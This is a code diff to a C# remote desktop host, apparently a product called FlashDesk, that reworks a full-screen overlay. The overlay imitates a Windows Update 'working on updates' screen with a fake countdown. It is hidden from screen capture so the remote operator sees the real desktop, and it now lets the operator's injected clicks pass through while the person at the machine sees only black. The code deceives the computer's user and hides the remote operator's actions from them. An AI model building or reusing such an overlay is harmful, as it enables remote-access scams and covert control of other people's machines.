@@ -6,18 +6,28 @@ namespace RemoteDesktop.Host;
 /// <summary>
 /// Full-screen topmost black overlay shown on the CLIENT'S own screen when the operator requests
 /// it. Mimics the Windows Update in-progress screen — "Windows needs to do the update" with a
-/// live 7-minute countdown — so the person sitting at that computer understands they should wait
+/// live 3-minute countdown — so the person sitting at that computer understands they should wait
 /// and not touch the machine.
 ///
-/// <para>The countdown is cosmetic: when the counter hits zero it loops back to the top and
-/// restarts, so the display stays plausible for as long as the operator keeps the overlay active.
-/// The overlay is only removed when the operator unchecks "Black screen" in their session window —
-/// the timer expiring has no effect on the overlay's lifetime.</para>
+/// <para>When the countdown reaches zero the overlay closes itself and fires <see cref="Expired"/>
+/// so the operator can be notified to uncheck the "Black screen" control. The operator can also
+/// dismiss it early by unchecking that control.</para>
+///
+/// <para>The overlay is marked <see cref="WS_EX_TRANSPARENT"/> so injected mouse input from the
+/// remote operator passes through to the windows below — they need full desktop access while the
+/// overlay is up. Physical mouse input also passes through, but the person at the machine sees only
+/// the black screen and cannot see where they are clicking, which is the intended deterrent.</para>
 /// </summary>
 internal sealed class BlackScreenOverlay : Form
 {
-    private const int TotalSeconds = 7 * 60; // 7 minutes
+    private const int TotalSeconds = 3 * 60; // 3 minutes
     private int _secondsLeft = TotalSeconds;
+
+    /// <summary>
+    /// Fired on the UI thread when the countdown reaches zero and the overlay has closed itself.
+    /// The caller should close any sibling overlays and notify the remote operator.
+    /// </summary>
+    public Action? Expired;
 
     private readonly Label _pctLabel;
     private readonly Label _timeLabel;
@@ -98,20 +108,36 @@ internal sealed class BlackScreenOverlay : Form
     internal static BlackScreenOverlay[] CreateForAllScreens()
         => Screen.AllScreens.Select(s => new BlackScreenOverlay(s)).ToArray();
 
-    // ─── capture exclusion ───────────────────────────────────────────────
+    // ─── capture exclusion + input pass-through ──────────────────────────
     // WDA_EXCLUDEFROMCAPTURE (0x11) instructs the DWM compositor to omit this window from all
     // screen-capture APIs — DXGI Desktop Duplication, GDI BitBlt, PrintWindow — so the operator's
     // viewer continues to see the real desktop while the person at this machine sees the overlay.
     // Available on Windows 10 2004+ (build 19041), which is inside FlashDesk's minimum target.
+    //
+    // WS_EX_TRANSPARENT makes all mouse messages fall through to the window behind the overlay.
+    // Without it every SendInput click the operator injects lands on this form and is swallowed —
+    // the underlying applications never hear it and the viewer sees a frozen, unresponsive desktop.
+    // The physical person at the machine can also click through, but they see only black, so they
+    // cannot aim — the visual barrier is the deterrent, not input blocking.
 
     [DllImport("user32.dll", SetLastError = true)]
     private static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);
     private const uint WDA_EXCLUDEFROMCAPTURE = 0x00000011;
 
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern int GetWindowLong(IntPtr hWnd, int nIndex);
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
+    private const int GWL_EXSTYLE   = -20;
+    private const int WS_EX_LAYERED     = 0x00080000;
+    private const int WS_EX_TRANSPARENT = 0x00000020;
+
     protected override void OnHandleCreated(EventArgs e)
     {
         base.OnHandleCreated(e);
         SetWindowDisplayAffinity(Handle, WDA_EXCLUDEFROMCAPTURE);
+        int exStyle = GetWindowLong(Handle, GWL_EXSTYLE);
+        SetWindowLong(Handle, GWL_EXSTYLE, exStyle | WS_EX_LAYERED | WS_EX_TRANSPARENT);
     }
 
     // ─── helpers ─────────────────────────────────────────────────────────
@@ -152,13 +178,22 @@ internal sealed class BlackScreenOverlay : Form
     private void OnSecondTick(object? sender, EventArgs e)
     {
         if (_secondsLeft > 0)
+        {
             _secondsLeft--;
+            _timeLabel.Text = CountdownText();
+            int pct = (int)Math.Round((TotalSeconds - _secondsLeft) * 100.0 / TotalSeconds);
+            _pctLabel.Text = $"Working on updates  {Math.Min(pct, 99)}% complete";
+        }
         else
-            _secondsLeft = TotalSeconds; // loop back to the top when the countdown expires
-
-        _timeLabel.Text = CountdownText();
-        int pct = (int)Math.Round((TotalSeconds - _secondsLeft) * 100.0 / TotalSeconds);
-        _pctLabel.Text = $"Working on updates  {Math.Min(pct, 99)}% complete";
+        {
+            // Countdown finished — stop both timers so no further repaints fire after Close.
+            _secTimer.Stop();
+            _spinTimer.Stop();
+            // Notify the caller before closing: Close() re-enters the message pump, so the
+            // callback runs while the window is still alive and can be marshalled correctly.
+            Expired?.Invoke();
+            Close();
+        }
     }
 
     private string CountdownText()
